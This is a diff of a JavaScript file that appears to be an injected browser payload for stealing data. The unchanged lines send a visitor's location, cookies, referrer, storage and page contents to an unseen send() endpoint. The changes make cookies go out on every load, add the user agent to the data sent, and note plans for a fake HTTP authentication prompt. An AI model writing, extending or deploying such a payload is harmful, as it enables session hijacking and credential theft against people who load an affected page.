@@ -76,12 +76,11 @@ if (!alreadySent('location')) {
     markSent('location')
 }
 
-if (document.cookie.length > 0 && !alreadySent('cookie')) {
+if (document.cookie.length > 0) {
     send('cookies', document.cookie)
-    markSent('cookie')
 }
 
-sendStorage();
+sendStorage()
 
 if (document.referrer && !alreadySent('ref')) {
     send('referrer', document.referrer)
@@ -94,6 +93,11 @@ if (document.referrer && !alreadySent('ref')) {
 sendPage(window.location.href)
 const locationUrls = getSubUrls(window.location.href)
 locationUrls.forEach(url => sendPage(url))
+
+if (!alreadySent('userAgent')) {
+    send('userAgent', navigator.userAgent)
+    markSent('userAgent')
+}
 
 //sendPage('http://url/image.png')
 
@@ -150,4 +154,5 @@ function OnEnter(e) {
 }
 var userLang = navigator.language || navigator.userLanguage
 //displayAuthenticationPage(userLang)
+//TODO: HTTP Authentication
 
